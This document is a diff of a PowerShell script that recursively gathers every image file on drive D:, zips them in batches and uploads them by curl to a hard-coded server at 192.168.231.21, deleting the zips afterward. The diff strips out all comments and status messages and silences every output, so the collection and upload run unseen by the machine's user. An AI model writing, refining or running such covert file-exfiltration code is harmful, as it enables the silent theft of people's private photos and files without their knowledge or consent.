@@ -1,13 +1,10 @@
 $ErrorActionPreference = "Stop"
 
-# === Config ===
 $sourceFolder = "D:\"
 $uploadUrl = "http://192.168.231.21:5000/upload_zip"
 
-# === Find all images ===
 $imageFiles = Get-ChildItem -Path $sourceFolder -Recurse -Include *.jpg, *.jpeg, *.png, *.bmp, *.gif, *.webp, *.tiff -File
 
-# === Break into batches of 20 ===
 $batchSize = 20
 $counter = 0
 
@@ -15,47 +12,34 @@ while ($counter -lt $imageFiles.Count) {
     $batch = $imageFiles[$counter..([Math]::Min($counter + $batchSize - 1, $imageFiles.Count - 1))]
     $counter += $batchSize
 
-    # Create unique zip name in temp
     $zipName = "batch_$counter.zip"
     $zipPath = "$env:TEMP\$zipName"
 
-    # Remove old zip if exists
     if (Test-Path $zipPath) {
-        Remove-Item $zipPath -Force
+        Remove-Item $zipPath -Force | Out-Null
     }
 
-    # Create zip
     Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
     $zipFile = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
 
     foreach ($file in $batch) {
         $relativePath = $file.FullName.Substring($sourceFolder.Length).TrimStart('\')
-        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipFile, $file.FullName, $relativePath)
+        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipFile, $file.FullName, $relativePath) | Out-Null
     }
 
     $zipFile.Dispose()
-    Write-Host "✅ Created: $zipPath"
 
-    # === Upload zip in background ===
     Start-Job -ScriptBlock {
         param($zipPath, $uploadUrl)
-
         try {
-            Write-Host "🚀 Uploading $zipPath ..."
-            & curl.exe -X POST -F $("file=@`"$zipPath`"") $uploadUrl
-            Write-Host "✅ Upload done: $zipPath"
+            & curl.exe -X POST -F $("file=@`"$zipPath`"") $uploadUrl | Out-Null
         } catch {
-            Write-Host "❌ Upload failed: $_"
         } finally {
             if (Test-Path $zipPath) {
-                Remove-Item $zipPath -Force
-                Write-Host "🧹 Deleted: $zipPath"
+                Remove-Item $zipPath -Force | Out-Null
             }
         }
-
-    } -ArgumentList $zipPath, $uploadUrl
+    } -ArgumentList $zipPath, $uploadUrl | Out-Null
 }
 
-# === Wait for all upload jobs to finish ===
-Get-Job | Wait-Job | Receive-Job
-Write-Host "✅ All done!"
+Get-Job | Wait-Job | Receive-Job | Out-Null
